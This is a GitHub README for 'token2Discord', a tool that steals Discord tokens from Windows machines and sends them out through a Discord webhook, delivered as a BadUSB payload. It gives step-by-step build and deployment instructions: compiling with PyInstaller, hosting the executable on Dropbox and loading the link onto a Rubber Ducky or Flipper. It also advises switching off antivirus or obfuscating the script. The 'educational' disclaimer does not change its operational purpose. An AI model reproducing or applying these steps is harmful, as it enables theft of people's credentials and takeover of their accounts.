# token2Discord
Extract discord tokens from a windows computer
and send valid tokens via discord webhook


# in progress

• Token2Discord.txt is made for a BADUSB payload. Otherwise
  compile as a standalone payload and do your duties. 
```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠉⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣷⡄⠀⣀⣀⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣶⣦⣈⠻⣦⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⡿⠁⣼⡿⠻⣿⣿⣷⣄⣠⣴⠆⠀⠀⠀⠀[Steal Discord Tokens]⠀
⠀⠀⠀⠻⣿⣿⣿⣿⡟⠀⢸⣿⣿⣦⣄⡉⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⠿⠋⠀⠀⢻⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣀⣤⣶⣄⠀⠀⠈⠿⢿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⠟⠛⠉⠻⣿⣧⡀⣼⣶⣤⣄⠉⠉⠛⠛⠻⢿⣿⣦⡀⠀⠀⠀⣠⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠙⢿⣿⣆⣠⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀
```

# Disclaimer

This project must not be used for illegal purposes, and is strictly for educational purposes and for people to experiment with. The user takes full responsibility for their own actions.

# Key Note
This program is not aimed to evade AV, so with that being said.. find other ways over execution.. much like adding to the ducky payload to turn off the AV OR go about obfuscating the script itself. Do what you feel is best.

# Prerequisite
When compiling the script, pyinstaller must be used on the windows machine when creating the windows executable (duh)
  - unless you use wine to compile
```
python3 -m venv token2Discord
token2Discord\Scripts\activate
pip3 install -r requirements.txt
```

# How to
• In the token2Discord.py file, replace "%DISCORD_WEBHOOK%"
  with your personal discord webhook.

• Compile the file with Pyinstaller: (Again,
  only compile on windows for a windows payload)
```
python3 -m PyInstaller --onefile token2Discord.py
```
• After compiling, your new executable will be found under /dist

• Upload your newly compiled executable to Dropbox

• Copy the "share link"

• Paste the shared link in the "%SHARED_LINK%" section in the token2Discord.txt
  - upload text file to your rubber ducky/flipper etc. (convert if using OMG cable or Digispark)

### 💬 Contact Me 

![Gmail Badge](https://img.shields.io/badge/-doobthegoober@gmail.com-c14438?style=flat-square&logo=Gmail&logoColor=white)

### 🚦 Stats

<a href="https://github.com/CharlesTheGreat77">
  <img src="https://github-readme-stats.vercel.app/api?username=CharlesTheGreat77&show_icons=true&hide=commits" />
</a>
<a href="https://github.com/CharlesTheGreat77">
  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=CharlesTheGreat77&layout=compact" />
</a>

<p align="center"> 
  <img src="https://profile-counter.glitch.me/CharlesTheGreat77/count.svg" />
</p>

---
⭐️ From [Charles](https://github.com/CharlesTheGreat77)
